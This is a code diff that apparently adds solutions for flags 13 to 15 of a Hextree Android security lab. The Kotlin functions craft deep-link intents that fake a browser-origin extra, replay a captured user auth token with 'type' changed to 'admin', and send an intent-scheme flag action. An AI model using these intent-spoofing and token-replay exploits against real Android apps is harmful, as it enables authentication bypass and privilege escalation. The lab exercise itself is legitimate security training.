@@ -277,6 +277,88 @@ class Attack(private val context: Context, private val activity: HextreeActivity
 		context.startActivity(intent)
 	}
 
+	// ------------------- Deeplink Flags ------------------------//
+
+	/**
+	 * FLAG 13 - Browsable Deeplink
+	 * Technique: Crafted VIEW intent matching an exported Activity's deep link filter
+	 *
+	 * Flow:
+	 * 1. Build an ACTION_VIEW intent for hex://flag?action=give-me
+	 * 2. Add category BROWSABLE + extra "com.android.browser.application_id" -
+	 *    the app's own isDeeplink() check requires both to prove "a browser sent this"
+	 * 3. host == "flag" && query param action == "give-me" -> success()
+	 *
+	 * Key insight: the browser-id extra is just a value the app checks for -
+	 * any app can set it themselves, it proves nothing about real origin.
+	 */
+	fun flag13() {
+		val uri = "hex://flag?action=give-me".toUri()
+		val intent = Intent(Intent.ACTION_VIEW, uri).apply {
+			addCategory(Intent.CATEGORY_BROWSABLE)
+			putExtra("com.android.browser.application_id", packageName)
+		}
+		context.startActivity(intent)
+	}
+
+
+	/**
+	 * FLAG 14 - Hijack Web Login (replay step only)
+	 * Technique: Parameter tampering on an OAuth-style deep link redirect
+	 *
+	 * Flow:
+	 * 1. Open Flag14Activity with no action -> app generates authChallenge,
+	 *    stores it, opens mock login URL carrying that challenge
+	 * 2. Complete a normal "user" login -> mock server redirects back via
+	 *    hex://token?type=user&authToken=...&authChallenge=...
+	 * 3. Capture that authToken + authChallenge (logcat/LogHelper/your own filter)
+	 * 4. Replay the SAME authToken+authChallenge but swap type to "admin" -> success()
+	 *
+	 * Key insight: the server hashes/validates authToken and authChallenge, but
+	 * never binds `type` to either one - "admin" vs "user" is decided entirely
+	 * client-side by a query param you control, so a valid user token is reusable as admin.
+	 */
+	fun flag14() {
+		// Replace these two with values captured from a real "user" login first -
+		// open Flag14Activity with no action, complete the mock login in the
+		// browser, then grab authToken + authChallenge from the hex://token
+		// redirect it sends back (logcat / LogHelper).
+		val capturedAuthToken = "598cc075e4379d027f61c02866917c6f1d992c67"
+		val capturedAuthChallenge = "3a0630cf-ea0a-4f06-9fd7-9c1c32342632"
+
+		val uri = "hex://token".toUri().buildUpon()
+			.appendQueryParameter("type", "admin")
+			.appendQueryParameter("authToken", capturedAuthToken)
+			.appendQueryParameter("authChallenge", capturedAuthChallenge)
+			.build()
+
+		context.startActivity(Intent(Intent.ACTION_VIEW, uri))
+	}
+
+	/**
+	 * FLAG 15 - Intent Scheme Link
+	 * Technique: Reconstructing a full Intent (action + category + extras) as a
+	 * browser-deliverable intent:// URI, matched purely on action/category
+	 *
+	 * Flow:
+	 * 1. Build an intent with action io.hextree.action.GIVE_FLAG (no data/URI needed -
+	 *    manifest has no <data> tag, so matching is action+category only)
+	 * 2. Add category BROWSABLE + the browser-id extra, same gate as Flag13
+	 * 3. extra "action" (String) == "flag" && extra "flag" (Boolean) == true -> success()
+	 *
+	 * Key insight: Android's intent:// scheme lets a plain web link encode an
+	 * entire Intent, including typed extras - that's what the title's asking you to build.
+	 */
+	fun flag15() {
+		val intent = Intent("io.hextree.action.GIVE_FLAG").apply {
+			addCategory(Intent.CATEGORY_BROWSABLE)
+			putExtra("com.android.browser.application_id", packageName)
+			putExtra("action", "flag")
+			putExtra("flag", true)
+		}
+		context.startActivity(intent)
+	}
+
 	// ------------------- Broadcast Receiver Flags ------------------------//
 
 	/**
